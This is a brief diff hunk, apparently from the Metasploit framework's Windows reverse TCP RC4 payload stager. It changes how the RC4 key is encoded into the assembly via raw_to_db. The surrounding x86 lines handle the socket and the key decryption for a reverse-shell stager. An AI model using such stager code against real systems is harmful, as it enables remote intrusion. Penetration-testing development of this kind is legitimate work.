@@ -125,7 +125,7 @@ module Payload::Windows::ReverseTcpRc4
           push edi             ; save socket
           mov edi, ebx         ; address of S-box
           call after_key       ; Call after_key, this pushes the address of the key onto the stack.
-          db "#{opts[:rc4key]}"
+          db #{raw_to_db(opts[:rc4key])}
       after_key:
         pop esi                ; ESI = RC4 key
       #{asm_decrypt_rc4}
